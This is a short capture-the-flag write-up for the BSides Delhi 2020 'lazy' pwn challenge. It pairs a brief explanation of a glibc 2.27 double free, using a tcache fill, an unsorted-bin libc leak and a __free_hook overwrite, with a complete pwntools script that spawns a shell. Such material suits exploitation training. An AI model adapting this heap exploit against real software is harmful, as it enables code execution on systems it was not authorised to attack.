## Bsides Delhi 2020: lazy [pwn]

#### Short writeup for now, detailed explanation later. Challenge revolves around GLIBC 2.27 heap, a double free vulnerability to which we will use after filling the tcache bin and leaking a libc pointer from the unsorted bin. Typicall overwrite `__free_hook` to system's address plan follows. 

#### The reason the unsorted bin is important to us is because as soon as a chunk goes into the unsorted bin, a pointer to the unsorted bin (which exists within libc) is inserted into the forward and back pointers of that free chunk.

```python
from pwn import *

#:
binary = ELF('./chall', checksec = False)
libc = ELF('./libc.so.6', checksec = False)
p = process('./chall', env = {'LD_PRELOAD' : './libc.so.6'})

breakpoints = ['break *addChunk + 239', 'break *deleteChunk + 146']
#gdb.attach(p.pid, gdbscript = '\n'.join([br for br in breakpoints]))

print(p.recvuntil('Choice >> '))

def alloc_chunk(size, data):
	p.sendline('1')
	print(p.recvuntil('>> '))
	p.sendline(str(size))
	print(p.recvuntil('>> '))
	p.sendline(data)
	print(p.recvuntil('Choice >> '))

def view_chunk(index):
	p.sendline('2')
	print(p.recvuntil('>> '))
	p.sendline(str(index))
	print(p.recvuntil('Choice >> '))

def delete_chunk(index):
	p.sendline('3')
	print(p.recvuntil('>> '))
	p.sendline(str(index))
	print(p.recvuntil('Choice >> '))

alloc_chunk(0x98, p64(libc.got['malloc']))
alloc_chunk(0x20, 'test')

for i in range(7):
	delete_chunk(0)

delete_chunk(0)

#: view chunk 0 to get libc leak
p.sendline('2')
print(p.recvuntil('>> '))
p.sendline('0')

arena_leak = u64(p.recvuntil('Choice >> ').split('\n')[1].ljust(8, '\x00'))
malloc_leak = arena_leak - 0x354bc0
libc_base = malloc_leak - libc.symbols['malloc']

free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']

print('[*] libc base: {}'.format(hex(libc_base)))
print('[*] __free_hook: {}'.format(hex(free_hook)))
print('[*] system: {}'.format(hex(system)))

delete_chunk(1)
delete_chunk(1)

alloc_chunk(0x20, p64(free_hook)) #: double free chunk, adds pointer to freehook in tcache
alloc_chunk(0x20, '/bin/sh\x00') #: double free chunk
alloc_chunk(0x20, p64(system)) #: pointer to __free_hook

p.sendline('3')
p.sendline('3')
p.interactive()
```